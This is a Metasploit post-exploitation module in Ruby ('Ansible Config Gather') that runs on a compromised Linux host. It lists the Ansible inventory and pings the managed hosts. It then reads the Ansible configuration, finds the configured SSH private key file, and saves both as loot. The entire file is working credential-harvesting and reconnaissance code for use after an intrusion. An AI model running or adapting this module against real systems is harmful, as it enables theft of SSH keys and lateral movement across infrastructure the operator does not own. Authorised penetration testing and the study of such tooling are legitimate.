##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report
  include Msf::Exploit::Local::Ansible

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ansible Config Gather',
        'Description' => %q{
          This module will grab ansible information including hosts, ping status, and the configuration file.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # Metasploit Module
        ],
        'Platform' => ['linux', 'unix'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'References' => [
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptString.new('ANSIBLECFG', [true, 'Ansible config file location', '']),
        OptString.new('HOSTS', [ true, 'Which ansible hosts to target', 'all' ]),
      ]
    )

    register_advanced_options(
      [
        OptString.new('ANSIBLEINVENTORY', [true, 'Ansible-inventory executable location', '']),
      ]
    )
  end

  def ansible_inventory
    return @ansible_inv if @ansible_inv

    [datastore['ANSIBLEINVENTORY'], '/usr/local/bin/ansible-inventory'].each do |exec|
      next if exec.empty?
      next unless file?(exec)
      next unless executable?(exec)

      @ansible_inv = exec
      return @ansible_inv
    end
    @ansible_inv
  end

  def ansible_cfg
    return @ansible_cfg if @ansible_cfg

    [datastore['ANSIBLECFG'], '/etc/ansible/ansible.cfg', '/playbook/ansible.cfg'].each do |cfg|
      next if cfg.empty?
      next if cfg.empty?
      next unless file?(cfg)

      @ansible_cfg = cfg
      return @ansible_cfg
    end
    @ansible_cfg
  end

  def ping_hosts_print
    results = ping_hosts(datastore['HOSTS'])
    if results.nil?
      print_error('Unable to parse ping hosts results')
      return
    end

    columns = ['Host', 'Status', 'Ping', 'Changed']
    table = Rex::Text::Table.new('Header' => 'Ansible Pings', 'Indent' => 1, 'Columns' => columns)

    results.each do |match|
      table << [match['host'], match['status'], match['ping'], match['changed']]
    end
    print_good(table.to_s) unless table.rows.empty?
  end

  def conf
    config_path = ansible_cfg
    unless config_path && file?(config_path)
      print_bad('Unable to find config file')
      return
    end

    ansible_config = read_file(config_path)
    unless ansible_config
      print_warning("Unable to read Ansible config file: #{config_path}")
      return
    end

    stored_config = store_loot('ansible.cfg', 'text/plain', session, ansible_config, 'ansible.cfg', 'Ansible config file')
    print_good("Stored config to: #{stored_config}")
    settings = Rex::Parser::Ini.from_s(ansible_config).fetch('defaults', {})
    private_key = settings.find { |name, _value| name.strip == 'private_key_file' }
    return unless private_key

    file = private_key.last.strip
    return unless file?(file)

    print_good("Private key file location: #{file}")
    unless readable?(file)
      print_warning("Private key file is not readable: #{file}")
      return
    end

    key = read_file(file)
    unless key
      print_warning("Unable to read private key file: #{file}")
      return
    end

    loot = store_loot('ansible.private.key', 'text/plain', session, key, 'private.key', 'Ansible private key')
    print_good("Stored private key file to: #{loot}")
  end

  def hosts_list
    hosts = cmd_exec("#{ansible_inventory} --list")
    hosts = JSON.parse(hosts)
    metadata = hosts.is_a?(Hash) ? hosts['_meta'] : nil
    hostvars = metadata.is_a?(Hash) ? metadata['hostvars'] : nil
    unless hostvars.is_a?(Hash) && hostvars.values.all? { |entry| entry.is_a?(Hash) }
      fail_with(Failure::UnexpectedReply, 'Ansible inventory did not return a valid host-variable map')
    end

    inventory = store_loot('ansible.inventory', 'application/json', session, JSON.generate(hosts), 'ansible_inventory.json', 'Ansible inventory')
    print_good("Stored inventory to: #{inventory}")
    columns = ['Host', 'Connection']
    table = Rex::Text::Table.new('Header' => 'Ansible Hosts', 'Indent' => 1, 'Columns' => columns)
    hostvars.each do |host|
      table << [host[0], host[1]['ansible_connection']]
    end
    print_good(table.to_s) unless table.rows.empty?
  rescue JSON::ParserError => e
    elog('Unable to parse Ansible inventory output', error: e)
    fail_with(Failure::UnexpectedReply, 'Unable to parse Ansible inventory output')
  end

  def run
    fail_with(Failure::NotFound, 'Ansible executable not found') if ansible_exe.nil?
    hosts_list
    ping_hosts_print
    conf
  end
end
